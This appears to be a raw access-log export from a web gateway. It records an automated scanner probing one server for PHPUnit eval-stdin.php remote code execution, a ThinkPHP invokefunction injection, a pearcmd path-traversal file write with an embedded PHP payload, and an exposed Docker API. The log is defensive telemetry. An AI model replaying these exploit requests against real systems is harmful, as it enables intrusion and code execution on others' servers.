AdditionalFields
"{""timeStamp"":""2026-03-06T00:22:40.0000000Z"",""originalRequestUriWithArgs"":""/vendor/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":5,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""149ca0b56c7a50c202a6030c2bd2aabe"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:40.0000000Z"",""originalRequestUriWithArgs"":""/vendor/phpunit/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":6,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""8ba4431df03d88963d25fdacde0991c1"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:41.0000000Z"",""originalRequestUriWithArgs"":""/vendor/phpunit/phpunit/LICENSE/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":7,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""8f552a9d8fd3ed88aca03ca663d5cbaa"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:41.0000000Z"",""originalRequestUriWithArgs"":""/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":8,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""0ac6895292b1c5407ea3615008126b77"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:42.0000000Z"",""originalRequestUriWithArgs"":""/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":9,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""795969c286662df7b488234a1aa82d57"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:42.0000000Z"",""originalRequestUriWithArgs"":""/phpunit/phpunit/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":10,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""f64a860899fee40bae39ab29ed3a31f4"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:43.0000000Z"",""originalRequestUriWithArgs"":""/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":11,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""e9152d9c32f243918cc9d201095804ca"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:43.0000000Z"",""originalRequestUriWithArgs"":""/phpunit/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":12,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""5138789904588936ddb6d4431da6b86e"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:43.0000000Z"",""originalRequestUriWithArgs"":""/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":13,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""fd267ca176d987957e3968ef50731630"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:43.0000000Z"",""originalRequestUriWithArgs"":""/lib/phpunit/phpunit/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":14,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""6a219d356f794c659c10f9e54b3a0f81"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:44.0000000Z"",""originalRequestUriWithArgs"":""/lib/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":15,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""03534b0baeca213a1d443f2d01ddbaf0"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:44.0000000Z"",""originalRequestUriWithArgs"":""/lib/phpunit/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":16,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""24e8d812c628932c33102bb56bcca579"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:48.0000000Z"",""originalRequestUriWithArgs"":""/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":17,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""3c6f0c10c2ee39d5a11304eac7df8eff"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:22:49.0000000Z"",""originalRequestUriWithArgs"":""/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":18,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""6b460505bcdbf9e468a218b27d33c261"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:00.0000000Z"",""originalRequestUriWithArgs"":""/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":35,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""53a050391d759dda5d379a49b3090877"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:00.0000000Z"",""originalRequestUriWithArgs"":""/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":36,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""d6eee3e8f2de1167e215c7b160e228f9"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:01.0000000Z"",""originalRequestUriWithArgs"":""/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":37,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""971184252a30cffa8b6e7908ee37adbf"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:01.0000000Z"",""originalRequestUriWithArgs"":""/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":38,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""92f876f5db28403a2cb0c82b6f5aa13e"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:02.0000000Z"",""originalRequestUriWithArgs"":""/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""contentType"":""text/plain"",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":39,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""20741fb1faaa3723e7736a878a5f19ac"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:02.0000000Z"",""originalRequestUriWithArgs"":""/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"",""contentType"":"""",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":40,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""679352f200aa67ab119167c3b14a4dd0"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:03.0000000Z"",""originalRequestUriWithArgs"":""/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"",""contentType"":"""",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":41,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""ff4aa41fedf44475520e2349736ddfe8"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:03.0000000Z"",""originalRequestUriWithArgs"":""/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\""hi\""));?>+/tmp/index1.php"",""contentType"":"""",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":42,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""4de760584bceb45acfb6b1e72346eec0"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:04.0000000Z"",""originalRequestUriWithArgs"":""/index.php?lang=../../../../../../../../tmp/index1"",""contentType"":"""",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":43,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""07d10c13227eb175ac57bb277830aa51"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
"{""timeStamp"":""2026-03-06T00:23:04.0000000Z"",""originalRequestUriWithArgs"":""/containers/json"",""contentType"":"""",""error_info"":""ERRORINFO_NO_ERROR"",""connectionSerialNumber"":771345,""noOfConnectionRequests"":44,""clientResponseTime"":0,""WAFEvaluationTime"":"""",""WAFMode"":"""",""WAFPolicyID"":"""",""transactionId"":""01fca4465a26b120bc3e2407aae2ac43"",""sslCipher"":""TLS_AES_256_GCM_SHA384"",""sslProtocol"":""TLSv1.3"",""sslClientVerify"":""NONE"",""sslClientCertificateFingerprint"":"""",""sslClientCertificateIssuerName"":"""",""serverRouted"":"""",""serverStatus"":"""",""serverResponseLatency"":"""",""serverConnectTime"":"""",""serverHeaderTime"":"""",""upstreamSourcePort"":"""",""originalHost"":""52.228.102.188"",""backendSslProtocol"":"""",""backendSslCipher"":""""}"
